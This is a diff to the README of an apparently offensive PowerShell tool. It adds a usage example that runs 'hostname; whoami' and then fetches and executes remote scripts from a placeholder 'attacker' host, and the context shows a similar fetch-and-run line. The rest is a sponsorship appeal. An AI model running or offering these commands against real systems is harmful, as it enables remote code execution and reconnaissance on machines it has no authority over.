@@ -51,6 +51,12 @@ function run {
     run /script="http://attacker/script1.ps1; http://attacker/script2.ps1"
     ```
 
+- Execute remote script(s) followed by command(s):
+
+    ```powershell
+    run /cmd="hostname; whoami" /script="http://attacker/script1.ps1; http://attacker/script2.ps1"
+    ```
+
 ## Sponsor 💓
 
 If you want to support this project and appreciate the time invested in developping, maintening and extending it; consider donating toward my next (cup of coffee ☕/lamborghini 🚗) - as **a lot** of my **personal time** went into creating this project. 😪
